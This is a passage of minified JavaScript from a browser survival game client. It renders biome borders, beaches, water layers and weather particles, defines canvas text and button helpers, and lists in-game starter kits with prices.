                        0 == (T.v & Ue.LEFT) && -xe.cam.x >= i - Le - 700 && -xe.cam.x <= i - 20 && -xe.cam.y >= r + 88 - Ge && -xe.cam.y <= n + 50 && (Br(i, r + 88, n - 88, xe.beach[1], Fe.BIOME[T.t], T.v & Ue.LEFT),
                            wr(i, r + 88, n - 88, xe.beach[1], Fe.BIOME[T.t], T.v & Ue.LEFT)),
                        0 == (T.v & Ue.BOTTOM) && -xe.cam.x >= i - 235 - Le && -xe.cam.x <= t + 350 && -xe.cam.y >= n - Ge - 275 && -xe.cam.y <= n + 490 && (Ur(n - 230, i - 230, t + 230, xe.beach[2], Fe.BIOME[T.t], T.v & Ue.BOTTOM),
                            Yr(n - 230, i - 230, t + 230, xe.beach[2], Fe.BIOME[T.t], T.v & Ue.BOTTOM)),
                        0 == (T.v & Ue.TOP)) && -xe.cam.x >= i - 235 - Le && -xe.cam.x <= t + 350 && -xe.cam.y >= r - Ge - 390 && -xe.cam.y <= r + 315 && (Wr(r + 310, i - 230, t + 230, xe.beach[3], Fe.BIOME[T.t], T.v & Ue.TOP),
                            Vr(r + 310, i - 230, t + 230, xe.beach[3], Fe.BIOME[T.t], T.v & Ue.TOP));
                for (u = Fe.biomes.length - 1; 0 <= u; u--)
                    (T = Fe.biomes[u]).t !== Fe.BIOME_SEA && (t = T.x2,
                        T.t !== Fe.BIOME_SEA && (t -= 400),
                        i = T.x1,
                        T.t !== Fe.BIOME_SEA && (i += 400),
                        n = T.y2,
                        T.t !== Fe.BIOME_SEA && (n -= 300),
                        r = T.y1,
                        T.t !== Fe.BIOME_SEA && (r += 300),
                        0 != (T.v & Ue.RIGHT) && -xe.cam.x >= t - Le + 120 && -xe.cam.x <= t + 820 && -xe.cam.y >= r + 88 - Ge && -xe.cam.y <= n + 50 && kr(t, r + 88, n - 88, xe.beach[0], Fe.BIOME[T.t], T.v & Ue.RIGHT),
                        0 != (T.v & Ue.LEFT) && -xe.cam.x >= i - Le - 700 && -xe.cam.x <= i - 20 && -xe.cam.y >= r + 88 - Ge && -xe.cam.y <= n + 50 && Br(i, r + 88, n - 88, xe.beach[1], Fe.BIOME[T.t], T.v & Ue.LEFT),
                        0 != (T.v & Ue.BOTTOM) && -xe.cam.x >= i - 235 - Le && -xe.cam.x <= t + 350 && -xe.cam.y >= n - Ge - 275 && -xe.cam.y <= n + 490 && Ur(n - 230, i - 230, t + 230, xe.beach[2], Fe.BIOME[T.t], T.v & Ue.BOTTOM),
                        0 != (T.v & Ue.TOP)) && -xe.cam.x >= i - 235 - Le && -xe.cam.x <= t + 350 && -xe.cam.y >= r - Ge - 390 && -xe.cam.y <= r + 315 && Wr(r + 310, i - 230, t + 230, xe.beach[3], Fe.BIOME[T.t], T.v & Ue.TOP);
                for (u = Fe.biomes.length - 1; 0 <= u; u--)
                    (T = Fe.biomes[u]).t !== Fe.BIOME_SEA && (e = Fe.BIOME[T.t],
                        -xe.cam.x >= T.x1 - 230 - Le) && -xe.cam.x <= T.x2 + 330 && -xe.cam.y >= T.y1 - Ge && -xe.cam.y <= T.y2 + 100 && (t = T.x2,
                            T.t !== Fe.BIOME_SEA && (0 == (T.v & Ue.RIGHT) ? t -= 414 : t -= 610),
                            i = T.x1,
                            T.t !== Fe.BIOME_SEA && (0 == (T.v & Ue.LEFT) ? i += 414 : i += 610),
                            n = T.y2,
                            T.t !== Fe.BIOME_SEA && (0 == (T.v & Ue.BOTTOM) ? n -= 414 : n -= 610),
                            r = T.y1,
                            T.t !== Fe.BIOME_SEA && (0 == (T.v & Ue.TOP) ? r += 414 : r += 610),
                            Fe.transition ? (o = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                                fe.fillStyle = Pr(e.night[0], e.night[1], e.night[2], e.day[0], e.day[1], e.day[2], o)) : fe.fillStyle = e._color[Fe.time],
                            a = Math.max(xe.cam.x + i - 2 - 230, 0),
                            s = Math.max(-xe.cam.x + Le - t - 330 - 2, 0),
                            _ = Math.max(xe.cam.y + r - 2, 0),
                            E = Math.max(-xe.cam.y + Ge - n - 100 - 2, 0),
                            fe.beginPath(),
                            fe.fillRect(a, _, Le - s - a, Ge - _ - E));
                Se.quality && (Hr(cr, Sr, mr, br, Nr, ze.WAVE_TWO, "isl", 2),
                    Hr(cr, Sr, mr, br, Nr, ze.WAVE_ONE, "isl", 2)),
                    Hr(pr, Sr, mr, br, Nr, ze.ISLAND, "isl", 2),
                    Se.quality && Hr(Rr, Sr, mr, br, Nr, ze.DECORATION, "de");
                for (var d, T, A = Fe.units[Ye.PLAYERS], u = 0; u < A.length; u++)
                    for (var h = A[u], l = 0; l < h.foot.length; l++)
                        d = h.foot[l],
                            fe.save(),
                            fe.translate(xe.cam.x + d.x, xe.cam.y + d.y),
                            fe.rotate(d.angle),
                            fe.globalAlpha = d.alpha,
                            d = sprite[d.id][Fe.time],
                            Ke(fe, d, -d.width / 2, -d.height / 2),
                            fe.globalAlpha = 1,
                            fe.restore();
                for (60 < (En += 40 * qe) && (En -= 60),
                    Hr(un, Sr, mr, br, Nr, ze.RIVER, "r", 0),
                    u = 0; u < Fe.biomes.length; u++)
                    (T = Fe.biomes[u]).t !== Fe.BIOME_SEA && (t = T.x2,
                        T.t !== Fe.BIOME_SEA && (t -= 400),
                        i = T.x1,
                        T.t !== Fe.BIOME_SEA && (i += 400),
                        n = T.y2,
                        T.t !== Fe.BIOME_SEA && (n -= 300),
                        r = T.y1,
                        T.t !== Fe.BIOME_SEA && (r += 300),
                        0 < (T.v & Ue.RIGHT) && -xe.cam.x >= t - Le + 120 && -xe.cam.x <= t + 820 && -xe.cam.y >= r + 88 - Ge && -xe.cam.y <= n + 50 && Kr(t, r + 88, n - 88, xe.beach[0], Fe.BIOME[T.t], T.v & Ue.RIGHT),
                        0 < (T.v & Ue.LEFT) && -xe.cam.x >= i - Le - 700 && -xe.cam.x <= i - 20 && -xe.cam.y >= r + 88 - Ge && -xe.cam.y <= n + 50 && wr(i, r + 88, n - 88, xe.beach[1], Fe.BIOME[T.t], T.v & Ue.LEFT),
                        0 < (T.v & Ue.BOTTOM) && -xe.cam.x >= i - 235 - Le && -xe.cam.x <= t + 350 && -xe.cam.y >= n - Ge - 275 && -xe.cam.y <= n + 490 && Yr(n - 230, i - 230, t + 230, xe.beach[2], Fe.BIOME[T.t], T.v & Ue.BOTTOM),
                        0 < (T.v & Ue.TOP)) && -xe.cam.x >= i - 235 - Le && -xe.cam.x <= t + 350 && -xe.cam.y >= r - Ge - 390 && -xe.cam.y <= r + 315 && Vr(r + 310, i - 230, t + 230, xe.beach[3], Fe.BIOME[T.t], T.v & Ue.TOP)
            }
            function Br(e, t, i, n, r, o) {
                var a, s = n.w1, _ = n.w2, E = n.w3, e = xe.cam.x + e - 700, t = Math.max(xe.cam.y + t, 0), i = Math.max(-xe.cam.y + Ge - i - 100, 0), u = t, t = Ge - t - i, i = (o ? n.t(s) : s.r).x, s = e + Ue.LW1SX, _ = (Ue.W1SX,
                    s += i + Ue.W1SX - 2,
                    i = (o ? n.t(_) : _.r).x,
                    e + Ue.LW2SX - s + i), d = (s += _ - 2) - 2;
                i = (o ? n.t(E) : E.r).x,
                    d < s + (_ = e + Ue.LW3SX - s + i) - 3 ? s += _ - 2 : s = d,
                    _ = e + Ue.LSANDX - s,
                    0 < o && 1 === r.isSand ? Fe.transition ? (a = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                        fe.fillStyle = Pr(15, 77, 72, 252, 239, 187, a)) : fe.fillStyle = ze.SAND_COLOR[Fe.time] : Fe.transition ? (a = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                            fe.fillStyle = Pr(r.night[0], r.night[1], r.night[2], r.day[0], r.day[1], r.day[2], a)) : fe.fillStyle = r._color[Fe.time],
                    fe.fillRect(s, u, _, t)
            }
            function wr(e, t, i, n, r, o) {
                var a, s, _, E, u, d, T = n.w1, A = n.w2, h = n.w3, e = xe.cam.x + e - 700, t = Math.max(xe.cam.y + t, 0), i = Math.max(-xe.cam.y + Ge - i - 100, 0), l = t, t = Ge - t - i, i = o ? n.t(T) : T.r, T = e + Ue.LW1SX, I = T, c = l, O = i.x + Ue.W1SX, g = t, p = T += i.x + Ue.W1SX - 2, A = (i = o ? n.t(A) : A.r,
                    e + Ue.LW2SX - T + i.x), R = T, C = l, b = A, N = t, S = (T += A - 2) - 2;
                i = o ? n.t(h) : h.r,
                    h = S < T + (A = e + Ue.LW3SX - T + i.x) - 3 ? (a = !0,
                        s = T,
                        _ = l,
                        u = t,
                        T += (E = A) - 2) : (a = !1,
                            T = S,
                            -1),
                    Ue.LSANDX,
                    Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                        fe.fillStyle = Pr(9, 55, 63, 11, 106, 132, d)) : fe.fillStyle = ze.WATER_3_COLOR[Fe.time],
                    fe.fillRect(I, c, O, g),
                    o ? Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                        fe.fillStyle = Pr(15, 70, 76, 42, 139, 155, d)) : fe.fillStyle = ze.WATER_2_COLOR[Fe.time] : Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                            fe.fillStyle = Pr(9, 55, 63, 11, 106, 132, d)) : fe.fillStyle = ze.WATER_3_COLOR[Fe.time],
                    fe.fillRect(R, C, b, N),
                    a && (o ? Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                        fe.fillStyle = Pr(17, 94, 96, 169, 214, 211, d)) : fe.fillStyle = ze.WATER_1_COLOR[Fe.time] : Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                            fe.fillStyle = Pr(9, 55, 63, 11, 106, 132, d)) : fe.fillStyle = ze.WATER_3_COLOR[Fe.time],
                        fe.fillRect(s, _, E, u)),
                    Se.quality && o && n.draw_foams_left(S, h, p, e, -xe.cam.y + c, -xe.cam.y + c + g)
            }
            function Wr(e, t, i, n, r, o) {
                var a, s = n.w1, _ = n.w2, E = n.w3, e = xe.cam.y + e - 700, t = Math.max(xe.cam.x + t, 0), i = Math.max(-xe.cam.x + Le - i - 100, 0), u = t, t = Le - t - i, i = (o ? n.t(s) : s.r).x, s = e + Ue.LW1SX, _ = (Ue.W1SX,
                    s += i + Ue.W1SX - 2,
                    i = (o ? n.t(_) : _.r).x,
                    e + Ue.LW2SX - s + i), d = (s += _ - 2) - 2;
                i = (o ? n.t(E) : E.r).x,
                    d < s + (_ = e + Ue.LW3SX - s + i) - 3 ? s += _ - 2 : s = d,
                    _ = e + Ue.LSANDX - s,
                    0 < o && 1 === r.isSand ? Fe.transition ? (a = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                        fe.fillStyle = Pr(15, 77, 72, 252, 239, 187, a)) : fe.fillStyle = ze.SAND_COLOR[Fe.time] : Fe.transition ? (a = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                            fe.fillStyle = Pr(r.night[0], r.night[1], r.night[2], r.day[0], r.day[1], r.day[2], a)) : fe.fillStyle = r._color[Fe.time],
                    fe.fillRect(u, s, t, _)
            }
            function Vr(e, t, i, n, r, o) {
                var a, s, _, E, u, d, T = n.w1, A = n.w2, h = n.w3, e = xe.cam.y + e - 700, t = Math.max(xe.cam.x + t, 0), i = Math.max(-xe.cam.x + Le - i - 100, 0), l = t, t = Le - t - i, i = o ? n.t(T) : T.r, T = e + Ue.LW1SX, I = l, c = T, O = i.x + Ue.W1SX, g = t, p = T += i.x + Ue.W1SX - 2, A = (i = o ? n.t(A) : A.r,
                    e + Ue.LW2SX - T + i.x), R = T, C = l, b = A, N = t, S = (T += A - 2) - 2;
                i = o ? n.t(h) : h.r,
                    h = S < T + (A = e + Ue.LW3SX - T + i.x) - 3 ? (a = !0,
                        s = T,
                        _ = l,
                        u = t,
                        T += (E = A) - 2) : (a = !1,
                            T = S,
                            -1),
                    Ue.LSANDX,
                    Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                        fe.fillStyle = Pr(9, 55, 63, 11, 106, 132, d)) : fe.fillStyle = ze.WATER_3_COLOR[Fe.time],
                    fe.fillRect(I, c, g, O),
                    o ? Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                        fe.fillStyle = Pr(15, 70, 76, 42, 139, 155, d)) : fe.fillStyle = ze.WATER_2_COLOR[Fe.time] : Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                            fe.fillStyle = Pr(9, 55, 63, 11, 106, 132, d)) : fe.fillStyle = ze.WATER_3_COLOR[Fe.time],
                    fe.fillRect(C, R, N, b),
                    a && (o ? Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                        fe.fillStyle = Pr(17, 94, 96, 169, 214, 211, d)) : fe.fillStyle = ze.WATER_1_COLOR[Fe.time] : Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                            fe.fillStyle = Pr(9, 55, 63, 11, 106, 132, d)) : fe.fillStyle = ze.WATER_3_COLOR[Fe.time],
                        fe.fillRect(_, s, u, E)),
                    Se.quality && o && n.draw_foams_top(S, h, p, e, -xe.cam.x + I, -xe.cam.x + I + g)
            }
            function kr(e, t, i, n, r, o) {
                var a, s = n.w1, _ = n.w2, E = n.w3, e = xe.cam.x + e + 820, t = Math.max(xe.cam.y + t, 0), i = Math.max(-xe.cam.y + Ge - i - 100, 0), u = t, t = Ge - t - i, i = (o ? n.t(s) : s.r).x, s = e + Ue.LW1SX, _ = (Ue.W1SX,
                    s += -i + Ue.W1SX + 2,
                    i = (o ? n.t(_) : _.r).x,
                    e - Ue.LW2SX - s - i), d = (s += 2 + _) - 2;
                i = (o ? n.t(E) : E.r).x,
                    d > s + (_ = e - Ue.LW3SX - s - i) ? s += 2 + _ : s = d,
                    _ = e - Ue.LSANDX - s,
                    0 < o && 1 === r.isSand ? Fe.transition ? (a = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                        fe.fillStyle = Pr(15, 77, 72, 252, 239, 187, a)) : fe.fillStyle = ze.SAND_COLOR[Fe.time] : Fe.transition ? (a = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                            fe.fillStyle = Pr(r.night[0], r.night[1], r.night[2], r.day[0], r.day[1], r.day[2], a)) : fe.fillStyle = r._color[Fe.time],
                    fe.fillRect(s, u, _, t)
            }
            function Kr(e, t, i, n, r, o) {
                var a, s, _, E, u, d, T = n.w1, A = n.w2, h = n.w3, e = xe.cam.x + e + 820, t = Math.max(xe.cam.y + t, 0), i = Math.max(-xe.cam.y + Ge - i - 100, 0), l = t, t = Ge - t - i, i = o ? n.t(T) : T.r, T = e + Ue.LW1SX, I = T, c = l, O = -i.x + Ue.W1SX, g = t, p = T += -i.x + Ue.W1SX + 2, A = (i = o ? n.t(A) : A.r,
                    e - Ue.LW2SX - T - i.x), R = T, C = l, b = A, N = t, S = (T += 2 + A) - 2;
                i = o ? n.t(h) : h.r,
                    h = S > T + (A = e - Ue.LW3SX - T - i.x) ? (a = !0,
                        s = T,
                        _ = l,
                        u = t,
                        T += 2 + (E = A)) : (a = !1,
                            T = S,
                            -1),
                    Ue.LSANDX,
                    Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                        fe.fillStyle = Pr(9, 55, 63, 11, 106, 132, d)) : fe.fillStyle = ze.WATER_3_COLOR[Fe.time],
                    fe.fillRect(I, c, O, g),
                    o ? Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                        fe.fillStyle = Pr(15, 70, 76, 42, 139, 155, d)) : fe.fillStyle = ze.WATER_2_COLOR[Fe.time] : Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                            fe.fillStyle = Pr(9, 55, 63, 11, 106, 132, d)) : fe.fillStyle = ze.WATER_3_COLOR[Fe.time],
                    fe.fillRect(R, C, b, N),
                    a && (o ? Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                        fe.fillStyle = Pr(17, 94, 96, 169, 214, 211, d)) : fe.fillStyle = ze.WATER_1_COLOR[Fe.time] : Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                            fe.fillStyle = Pr(9, 55, 63, 11, 106, 132, d)) : fe.fillStyle = ze.WATER_3_COLOR[Fe.time],
                        fe.fillRect(s, _, E, u)),
                    Se.quality && o && n.draw_foams_right(S, h, p, e, -xe.cam.y + c, -xe.cam.y + c + g)
            }
            function Ur(e, t, i, n, r, o) {
                var a, s = n.w1, _ = n.w2, E = n.w3, e = xe.cam.y + e + 710, t = Math.max(xe.cam.x + t, 0), i = Math.max(-xe.cam.x + Le - i - 100, 0), u = t, t = Le - t - i, i = (o ? n.t(s) : s.r).x, s = e + Ue.LW1SX, _ = (Ue.W1SX,
                    s += -i + Ue.W1SX + 2,
                    i = (o ? n.t(_) : _.r).x,
                    e - Ue.LW2SX - s - i), d = (s += 2 + _) - 2;
                i = (o ? n.t(E) : E.r).x,
                    d > s + (_ = e - Ue.LW3SX - s - i) ? s += 2 + _ : s = d,
                    _ = e - Ue.LSANDX - s,
                    0 < o && 1 === r.isSand ? Fe.transition ? (a = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                        fe.fillStyle = Pr(15, 77, 72, 252, 239, 187, a)) : fe.fillStyle = ze.SAND_COLOR[Fe.time] : Fe.transition ? (a = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                            fe.fillStyle = Pr(r.night[0], r.night[1], r.night[2], r.day[0], r.day[1], r.day[2], a)) : fe.fillStyle = r._color[Fe.time],
                    fe.fillRect(u, s, t, _)
            }
            function Yr(e, t, i, n, r, o) {
                var a, s, _, E, u, d, T = n.w1, A = n.w2, h = n.w3, e = xe.cam.y + e + 710, t = Math.max(xe.cam.x + t, 0), i = Math.max(-xe.cam.x + Le - i - 100, 0), l = t, t = Le - t - i, i = o ? n.t(T) : T.r, T = e + Ue.LW1SX, I = T, c = l, O = -i.x + Ue.W1SX, g = t, p = T += -i.x + Ue.W1SX + 2, A = (i = o ? n.t(A) : A.r,
                    e - Ue.LW2SX - T - i.x), R = T, C = l, b = A, N = t, S = (T += 2 + A) - 2;
                i = o ? n.t(h) : h.r,
                    h = S > T + (A = e - Ue.LW3SX - T - i.x) ? (a = !0,
                        s = T,
                        _ = l,
                        u = t,
                        T += 2 + (E = A)) : (a = !1,
                            T = S,
                            -1),
                    Ue.LSANDX,
                    Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                        fe.fillStyle = Pr(9, 55, 63, 11, 106, 132, d)) : fe.fillStyle = ze.WATER_3_COLOR[Fe.time],
                    fe.fillRect(c, I, g, O),
                    o ? Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                        fe.fillStyle = Pr(15, 70, 76, 42, 139, 155, d)) : fe.fillStyle = ze.WATER_2_COLOR[Fe.time] : Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                            fe.fillStyle = Pr(9, 55, 63, 11, 106, 132, d)) : fe.fillStyle = ze.WATER_3_COLOR[Fe.time],
                    fe.fillRect(C, R, N, b),
                    a && (o ? Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                        fe.fillStyle = Pr(17, 94, 96, 169, 214, 211, d)) : fe.fillStyle = ze.WATER_1_COLOR[Fe.time] : Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                            fe.fillStyle = Pr(9, 55, 63, 11, 106, 132, d)) : fe.fillStyle = ze.WATER_3_COLOR[Fe.time],
                        fe.fillRect(_, s, u, E)),
                    Se.quality && o && n.draw_foams_bottom(S, h, p, e, -xe.cam.x + c, -xe.cam.x + c + g)
            }
            function Fr() {
                var e;
                if (fe.globalAlpha = 1,
                    Fe.transition && (e = Fe.shade.update()),
                    Fe.update_dist_from_biomes(-xe.cam.x, -xe.cam.y),
                    br = Math.max(Math.floor(-xe.cam.x / Fe.dw) - 5, 0),
                    Nr = Math.min(Math.floor((-xe.cam.x + xe.cam.w) / Fe.dw) + 4, Fe.nw - 1),
                    Sr = Math.max(Math.floor(-xe.cam.y / Fe.dh) - 3, 0),
                    mr = Math.min(Math.floor((-xe.cam.y + xe.cam.h) / Fe.dh) + 3, Fe.nh - 1),
                    zr(),
                    Dr(),
                    Se.quality && Fe.mode !== Ue.MODE_ZOMBIES && Fe.mode !== Ue.MODE_LEGACY && Fe.mode !== Ue.MODE_BR) {
                    var t = xe.desert;
                    0 === t.tempest ? t.tempest_speed = Math.max(0, t.tempest_speed - qe / 10) : t.tempest_speed = Math.min(1, t.tempest_speed + qe / 10);
                    for (var i = t.flakes, n = 0; n < i.length; n++) {
                        var r = i[n];
                        t.update(r),
                            yr(ze.DESERT, r.id, xe.cam.x + r.x, xe.cam.y + r.y, r.alpha)
                    }
                    for (n = 0; n < i.length; n++)
                        ((r = i[n]).life <= 0 || r.x > -xe.cam.x + Le || r.x < -xe.cam.x - xe.cam.w / 2 || r.y > -xe.cam.y + Ge) && i.splice(n, 1);
                    var o = -xe.cam.y
                        , a = (-1e3 < Fe.dist_desert && t.add(o),
                            xe.winter);
                    0 === a.tempest ? a.tempest_speed = Math.max(0, a.tempest_speed - qe / 10) : a.tempest_speed = Math.min(1, a.tempest_speed + qe / 10);
                    for (var s = a.flakes, _ = 0; _ < s.length; _++) {
                        var E = s[_];
                        a.update(E),
                            yr(ze.FLAKES, E.id, xe.cam.x + E.x, xe.cam.y + E.y, E.alpha)
                    }
                    for (_ = 0; _ < s.length; _++)
                        ((E = s[_]).life <= 0 || E.x > -xe.cam.x + Le || E.x < -xe.cam.x || E.y > -xe.cam.y + Ge) && s.splice(_, 1);
                    o = -xe.cam.y,
                        -1e3 < Fe.dist_winter && a.add(o);
                    for (var u = xe.ash, d = u.flakes, T = 0; T < d.length; T++) {
                        var A = d[T];
                        u.update(A),
                            yr(ze.ASHES, A.id, xe.cam.x + A.x, xe.cam.y + A.y, A.alpha)
                    }
                    for (T = 0; T < d.length; T++)
                        ((A = d[T]).life <= 0 || A.x > -xe.cam.x + Le || A.x < -xe.cam.x || A.y > -xe.cam.y + Ge) && d.splice(T, 1);
                    o = -xe.cam.y,
                        -1e3 < Fe.dist_lava && u.add(o)
                }
                Fe.transition && e && (Fe.transition = !1,
                    Fe.shade.v = 0,
                    Fe.shade.o = !1)
            }
            var xr = 0
                , Jr = 1
                , Xr = 2
                , jr = 0
                , qr = 1
                , Ce = 2;
            function Zr(e, t) {
                e = e.getBoundingClientRect();
                return {
                    x: t.clientX - e.left,
                    y: t.clientY - e.top
                }
            }
            function Qr(e, t, i, n, r, o, a, s, _, E, u, d, T, A, h) {
                0 === e.length && (e = " "),
                    void 0 === a && (a = 0),
                    void 0 === s && (s = 0),
                    void 0 === _ && (_ = 0),
                    void 0 === A && (A = 0);
                var l = document.createElement("canvas")
                    , I = l.getContext("2d");
                return I.textBaseline = "middle",
                    I.font = (void 0 !== h ? h + " " : "") + n + "px " + t,
                    r = void 0 !== r ? Math.min(I.measureText(e).width, r) : I.measureText(e).width,
                    l.width = r + a,
                    l.height = n + s,
                    void 0 !== o && (void 0 !== u && (I.globalAlpha = u),
                        I.fillStyle = o,
                        void 0 !== d ? (roundRect(I, _ + 2, _, r + a - 2 * _ - 4, n + s - 2 * _, d),
                            I.fill()) : I.fillRect(_, _, r + a - 2 * _, n + s - 2 * _),
                        I.globalAlpha = 1,
                        0 !== _) && (I.lineWidth = _,
                            I.strokeStyle = E,
                            I.stroke()),
                    I.textBaseline = "middle",
                    I.font = (void 0 !== h ? h + " " : "") + n + "px " + t,
                    void 0 !== T && (I.strokeStyle = T,
                        I.lineWidth = A,
                        I.lineJoin = "miter",
                        I.miterLimit = 2,
                        I.strokeText(e, Math.floor(a / 2), Math.floor(s / 2) + Math.floor(n / 2), r)),
                    I.fillStyle = i,
                    I.fillText(e, Math.floor(a / 2), Math.floor(s / 2) + Math.floor(n / 2), r),
                    l.w2 = l.width / 2,
                    l.h2 = l.height / 2,
                    l
            }
            function be(e, t, i, n, r, a, o, s, _, E, u) {
                function d() {
                    return l.img[l.state]
                }
                function T(e) {
                    var t = l.translate;
                    return 0 !== l.width && 0 !== l.height || (l.width = l.img[0].width,
                        l.height = l.img[0].height),
                        e.x > t.x && e.x < t.x + l.width / r && e.y > t.y && e.y < t.y + l.height / r
                }
                var A, h, l = {
                    width: e,
                    height: t,
                    img: A = n ? n : A,
                    state: jr,
                    translate: {
                        x: s = void 0 === s ? 0 : s,
                        y: _ = void 0 === _ ? 0 : _,
                        _x: s,
                        _y: _
                    },
                    enable_breath: a = 1 !== a ? 0 : a,
                    breath: 0,
                    callback: o,
                    position: E = void 0 === E ? 0 : E,
                    active: u = void 0 === u ? 1 : u
                };
                return a = function () {
                    var e = 0;
                    return 1 === l.enable_breath && (l.state === qr || l.state === Ce ? l.breath = (l.breath + 1e3 * qe) % 1e3 : 0 < l.breath && (l.breath = 500 < l.breath ? l.breath + 1e3 * qe : l.breath - 1e3 * qe,
                        l.breath < 0 || 1e3 < l.breath) && (l.breath = 0),
                        e = .2 * Utils.ease_in_out_quad(500 < l.breath ? (1e3 - l.breath) / 500 : l.breath / 500)),
                        e
                }
                    ,
                    2 == (r = 3 === r ? 3 : 1 === r ? 2 : 1) ? h = function (e) {
                        var t = 1 + a()
                            , i = d()
                            , n = l.width * t / 2
                            , t = l.height * t / 2
                            , r = (n - l.width / 2) / 2
                            , o = (t - l.height / 2) / 2;
                        Ke(e, i, l.translate.x - r, l.translate.y - o, n, t)
                    }
                        : 3 === r ? (h = function (e) {
                            var t = d()
                                , i = l.width
                                , n = l.height
                                , r = (i - l.width) / 2
                                , o = (n - l.height) / 2;
                            Ke(e, t, l.translate.x - r, l.translate.y - o, i, n)
                        }
                            ,
                            r = 1) : h = function (e) {
                                Ke(e, d(), l.translate.x, l.translate.y)
                            }
                    ,
                {
                    info: l,
                    trigger: function (e, t, i) {
                        return T(t) ? (i == Jr ? l.state = Ce : (i == Xr || i == xr && l.state != Ce) && (l.state = qr),
                            !0) : (l.state = jr,
                                !1)
                    },
                    draw: h,
                    in_button: T
                }
            }
            function Ne(t, e, i, n, r) {
                var o = {
                    x: i,
                    y: n,
                    _x: i,
                    _y: n
                };
                return {
                    translate: o,
                    draw: function (e) {
                        Ke(e, t, o.x, o.y, t.width / 2, t.height / 2)
                    },
                    active: e,
                    position: r
                }
            }
            var $r = "1" === Utils.getURLData("id") ? 1 : 0
                , e2 = Utils.getURLData("password")
                , R = {
                    DELETE: 1,
                    HURT: 2,
                    COLD: 4,
                    HUNGER: 8,
                    ATTACK: 16,
                    WALK: 32,
                    IDLE: 64,
                    HEAL: 128,
                    WEB: 256
                }
                , t2 = [{
                    price: 1e3,
                    items: [[2, Be.FIRE], [1, Be.COOKED_MEAT], [8, Be.PLANT], [1, Be.BREAD]]
                }, {
                    price: 2e3,
                    items: [[2, Be.BIG_FIRE], [1, Be.PICK_WOOD], [2, Be.COOKED_MEAT], [16, Be.PLANT], [2, Be.BREAD]]
                }, {
                    price: 4e3,
                    items: [[3, Be.BIG_FIRE], [1, Be.PICK], [4, Be.COOKED_MEAT], [20, Be.PLANT], [4, Be.BREAD], [1, Be.WORKBENCH], [80, Be.STONE], [140, Be.WOOD]]
                }, {
                    price: 8e3,
                    items: [[1, Be.BAG], [4, Be.BIG_FIRE], [1, Be.PICK_GOLD], [6, Be.COOKED_MEAT], [30, Be.PLANT], [6, Be.BREAD], [1, Be.WORKBENCH], [150, Be.STONE], [200, Be.WOOD], [60, Be.GOLD], [2, Be.BOTTLE_FULL]]
                }, {
                    price: 16e3,
                    items: [[1, Be.BAG], [1, Be.PICK_DIAMOND], [1, Be.BED], [7, Be.CAKE], [2, Be.BOTTLE_FULL], [2, Be.BIG_FIRE], [1, Be.FURNACE], [15, Be.STONE_WALL], [2, Be.STONE_DOOR], [1, Be.TOTEM], [1, Be.SPANNER], [200, Be.STONE], [300, Be.WOOD]]
                }, {
                    price: 16e3,
                    items: [[1, Be.BAG], [1, Be.COAT], [1, Be.SHOVEL_GOLD], [1, Be.PICK_GOLD], [10, Be.CAKE], [4, Be.BOTTLE_FULL], [6, Be.BIG_FIRE], [3, Be.BANDAGE], [1, Be.BOOK], [200, Be.STONE], [300, Be.WOOD]]
                }, {
                    price: 16e3,
                    items: [[1, Be.BAG], [1, Be.HOOD], [1, Be.HAMMER_GOLD], [3, Be.BANDAGE], [1, 0], [1, Be.PICK_GOLD], [7, Be.CAKE], [2, Be.BOTTLE_FULL], [4, Be.BIG_FIRE], [150, Be.STONE], [200, Be.WOOD], [1, Be.LOCKPICK]]
                }, {
                    price: 16e3,
                    items: [[1, Be.BAG], [1, Be.PEASANT], [1, Be.PICK_GOLD], [7, Be.CAKE], [2, Be.BOTTLE_FULL], [4, Be.BIG_FIRE], [2, Be.WINDMILL], [4, Be.BREAD_OVEN], [10, Be.PLOT], [6, Be.WHEAT_SEED], [4, Be.SEED], [1, Be.WATERING_CAN_FULL], [500, Be.WOOD]]
                }, {
                    price: 16e3,
                    items: [[1, Be.BAG], [1, Be.PICK_GOLD], [16, Be.FOODFISH_COOKED], [1, Be.BOTTLE_FULL], [6, Be.BIG_FIRE], [3, Be.BANDAGE], [1, Be.DIVING_MASK], [1, Be.SWORD], [16, Be.BRIDGE], [150, Be.STONE], [200, Be.WOOD]]
                }, {
                    price: 2e4,
